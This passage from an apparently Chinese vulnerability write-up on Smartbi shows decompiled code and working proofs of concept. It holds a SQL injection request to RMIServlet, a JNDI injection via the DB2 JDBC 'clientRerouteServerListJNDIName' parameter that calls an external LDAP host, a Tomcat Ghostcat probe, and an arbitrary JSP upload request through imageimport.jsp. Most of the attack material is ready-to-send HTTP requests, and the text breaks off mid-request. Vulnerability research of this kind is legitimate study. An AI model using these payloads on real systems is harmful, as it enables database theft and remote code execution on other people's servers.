+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-sqf">Content-<span class="hljs-built_in">Type</span>: application/x-www-form-urlencoded</span><br><span class="language-sqf"></span><br><span class="language-sqf"><span class="hljs-built_in">className</span>=UrlLinkService&amp;methodName=getFileResource&amp;<span class="hljs-built_in">params</span>=[<span class="hljs-string">&quot;1&#x27;union select database(),2,3,4,5,6#&quot;</span>]</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=7DDE39A449342C004D2F35ABF13BB5AB<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>99<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UrlLinkService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>getFileResource<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;1&#x27;union select database(),2,3,4,5,6#&quot;</span>]</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659622.png" srcset="/img/loading.gif" lazyload alt="20250805182305339"></p>
+<h2 id="后台rce"><a href="#后台rce" class="headerlink" title="后台rce"></a>后台rce</h2><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncServlet.class</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659333.png" srcset="/img/loading.gif" lazyload alt="20250802145216052"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;<br>    request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;type&quot;</span>);<br>    response.setBufferSize(<span class="hljs-number">4096</span>);<br>    <span class="hljs-comment">//type=sqldictsync 时执行</span><br>    <span class="hljs-keyword">if</span> (type.equals(<span class="hljs-string">&quot;sqldictsync&quot;</span>)) &#123;<br>        <span class="hljs-comment">//记录时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-comment">//数据库连接参数</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbType</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbType&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbServer</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbServer&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbName&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbUser</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbUser&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbPass</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbPass&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">querySql</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;querySql&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">dbNameOnly</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;dbNameOnly&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">clientId</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">//输出调试日志，记录数据库名、查询语句等</span><br>        log.debug(<span class="hljs-string">&quot;sqldictsync[dbName:&quot;</span> + dbName + <span class="hljs-string">&quot;,dbNameOnly:&quot;</span> + dbNameOnly + <span class="hljs-string">&quot;,querySql:&quot;</span> + querySql + <span class="hljs-string">&quot;]&quot;</span>);<br>        <span class="hljs-comment">//如果 dbNameOnly == true，数据库名和 SQL 进行同步，执行SyncResources</span><br>        <span class="hljs-keyword">if</span> (dbNameOnly) &#123;<br>            clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbName, querySql);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//否则就完整使用所有连接信息进行数据库连接和 SQL 查询</span><br>            clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql);<br>        &#125;<br></code></pre></td></tr></table></figure>
+
+<p>此处的参数 dbType、dbServer、dbName等全部由用户输入，可控且无任何检验、过滤</p>
+<p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncResources.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//接收用户输入的数据库参数</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">synchronize</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//使用 DbUtil.getConnection 创建数据库连接，继续跟进</span><br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)<span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">if</span> (conn == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">colsCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br>        <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultSetReader</span>(conn, querySql, colsCount);<br>        <span class="hljs-type">DictTree</span> <span class="hljs-variable">tree</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DictTree</span>(reader);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.doSynchronize(tree);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>E:\Smartbi\SmartbiUnionServer\plugin\SmartbiPrestoClickHouseJdbc\smartbiCommon.jar!\smartbi\util\DbUtil.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String driver, String url, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>    info.setId(UUIDGenerator.generate());<br>    info.setName(connName);<br>    <span class="hljs-comment">// driver 和 url 参数都是从 drvInfo取值</span><br>    info.setDriver(driver);<br>    info.setUrl(url);<br>    info.setUser(dbUser);<br>    info.setPassword(dbPass);<br>    <span class="hljs-comment">//调用 getConnection 方法。执行 jdbc </span><br>    <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">DBType</span> <span class="hljs-variable">driverType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        driverType = DBType.valueOf(dbType.toUpperCase());<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);<br>    <span class="hljs-keyword">if</span> (drvInfo == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>        info.setId(UUIDGenerator.generate());<br>        info.setName(connName);<br>        info.setDriverType(driverType);<br>        info.setDriver(drvInfo[<span class="hljs-number">0</span>]);<br>        info.setUrl(drvInfo[<span class="hljs-number">1</span>]);<br>        info.setUser(dbUser);<br>        info.setPassword(dbPass);<br>        <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进 translateDriverInfo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName) &#123;<br>    <span class="hljs-keyword">return</span> translateDriverInfo(dbType, serverName, dbName, (String)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) &#123;<br>    String[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">2</span>];<br>    <span class="hljs-comment">//以 dbType 确定数据库类型</span><br>    <span class="hljs-keyword">switch</span> (dbType) &#123;<br>        <span class="hljs-keyword">case</span> DB2:<br>        <span class="hljs-keyword">case</span> DB2_400:<br>            result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;COM.ibm.db2.jdbc.net.DB2Driver&quot;</span>;<br>            result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DB2_V9:<br>            result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>;<br>            <span class="hljs-keyword">if</span> (serverName.indexOf(<span class="hljs-string">&quot;:&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;:50000/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>构造poc:</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>DB2_V9<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span>localhost:<span class="hljs-number">6688</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>a:a=a<span class="hljs-punctuation">;</span>clientRerouteServerListJNDIN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>ldap:<span class="hljs-comment">//169.254.39.1:1389/6bqlht;</span><br><br><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>DB2_V9<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span><span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>:<span class="hljs-number">18080</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>a:a=a<span class="hljs-punctuation">;</span>clientRerouteServerListJNDIN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>ldap:<span class="hljs-comment">//169.254.39.1:1389/6bqlht;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659797.png" srcset="/img/loading.gif" lazyload alt="20250802165747255"></p>
+<h2 id="tomcat-历史漏洞（实则没有）"><a href="#tomcat-历史漏洞（实则没有）" class="headerlink" title="tomcat 历史漏洞（实则没有）"></a>tomcat 历史漏洞（实则没有）</h2><p>确定 tomcat 版本为 <code>Apache Tomcat Version 7.0.34</code></p>
+<p>E:\Smartbi\Tomcat\RELEASE-NOTES</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700892.png" srcset="/img/loading.gif" lazyload alt="20250731181914395"></p>
+<h2 id="1、AJP-导致的-RCE"><a href="#1、AJP-导致的-RCE" class="headerlink" title="1、AJP 导致的 RCE"></a>1、AJP 导致的 RCE</h2><blockquote>
+<p>CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/12870365.html">https://www.cnblogs.com/backlion/p/12870365.html</a></p>
+<p>默认情况下,Apache Tomcat会开启AJP连接器,方便与其他Web服务器通过AJP协议进行交互.但Apache Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的AJP请求,可以读取或者包含Web应用根目录下的任意文件,如果配合文件上传任意格式文件，将可能导致任意代码执行(RCE).该漏洞利用AJP服务端口实现攻击,未开启AJP服务对外不受漏洞影响（tomcat默认将AJP服务开启并绑定至0.0.0.0&#x2F;0）.</p>
+</blockquote>
+<p>确认 18009 端口开放，且能够建立 TCP 连接：</p>
+<p><code>Test-NetConnection -ComputerName 127.0.0.1 -Port 18009</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700634.png" srcset="/img/loading.gif" lazyload alt="20250731185501657"></p>
+<p>使用 Ghostcat 漏洞检测工具：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p>
+<p>脚本成功建立了AJP协议连接返回了Tomcat 7.0.34的错误页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700131.png" srcset="/img/loading.gif" lazyload alt="20250731191051181"></p>
+<p>可能由于Smartbi对WEB-INF目录做了额外保护或者Tomcat配置了限制访问，并不能读取到文件</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文件位置：Tomcat&#x2F;webapps&#x2F;smartbi&#x2F;vision&#x2F;designer&#x2F;imageimport.jsp</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>&lt;%<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> request.getSession().getServletContext().getRealPath(<span class="hljs-string">&quot;&quot;</span>) + <span class="hljs-string">&quot;/vision/designer/images/&quot;</span>;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>    <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>       dir.mkdirs();<br>    &#125;<br>    <span class="hljs-comment">//从请求头 X-File-Name 获取上传文件名</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(request.getHeader(<span class="hljs-string">&quot;X-File-Name&quot;</span>).getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    <span class="hljs-comment">//获取文件类型</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileType</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;X-File-Type&quot;</span>);<br>    <span class="hljs-comment">//判断是否包含 image 字符串 </span><br>    <span class="hljs-keyword">if</span>(fileType.indexOf(<span class="hljs-string">&quot;image&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>       response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>       response.resetBuffer();<br>       response.getOutputStream().write(<span class="hljs-string">&quot;error file type!&quot;</span>.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>       <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + fileName);<br>    <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>    <span class="hljs-type">int</span> bytesRead;<br>    <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">// 4K buffer</span><br>    <span class="hljs-keyword">while</span> ((bytesRead = request.getInputStream().read(buf)) != -<span class="hljs-number">1</span>) &#123;<br>       fos.write(buf, <span class="hljs-number">0</span>, bytesRead);<br>    &#125;<br>    fos.flush();<br>    fos.close();<br>    smartbi.net.sf.json.<span class="hljs-type">JSONObject</span> <span class="hljs-variable">jobj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">smartbi</span>.net.sf.json.JSONObject();<br>    jobj.put(<span class="hljs-string">&quot;url&quot;</span>, path.substring(path.lastIndexOf(<span class="hljs-string">&quot;images/&quot;</span>)) + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-comment">//jobj.put(&quot;dir&quot;, dir.getCanonicalPath());</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">resultStr</span> <span class="hljs-operator">=</span> jobj.toString();<br>    response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>    response.resetBuffer();<br>    response.getOutputStream().write(resultStr.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    e.printStackTrace();<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>对上传的文件名、MIME类型无判断、不严谨，可伪造伪造文件类型上传成功，造成漏洞</p>
+<p><strong>漏洞复现：</strong></p>
+<p>路由：<a target="_blank" rel="noopener" href="http://localhost:18080/smartbi/vision/designer/imageimport.jsp">http://localhost:18080/smartbi/vision/designer/imageimport.jsp</a></p>
+<p>需要配置页（<a target="_blank" rel="noopener" href="http://localhost:18080/smartbi/vision/config.jsp%EF%BC%89%E7%9A%84%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%EF%BC%8C%E6%89%80%E4%BB%A5%E4%B8%8D%E8%83%BD%E5%92%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%BB%93%E5%90%88%EF%BC%8C%E5%B1%9E%E4%BA%8E%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E">http://localhost:18080/smartbi/vision/config.jsp）的登录密码，所以不能和未授权访问结合，属于后台漏洞</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700365.png" srcset="/img/loading.gif" lazyload alt="20250805160347015"></p>
+<p>poc:</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">//GET 和 POST 都可以</span><br>GET <span class="hljs-regexp">/smartbi/</span>vision<span class="hljs-regexp">/designer/im</span>ageimport.jsp HTTP/<span class="hljs-number">1.1</span><br><br>X-<span class="hljs-keyword">File</span>-Type: image<br>X-<span class="hljs-keyword">File</span>-Name: <span class="hljs-number">1</span>.jsp<br><br>&lt;%=<span class="hljs-string">&quot;qwer&quot;</span>%&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/smartbi/vision/designer/imageimport.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic YWRtaW46YWRtaW4=<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: 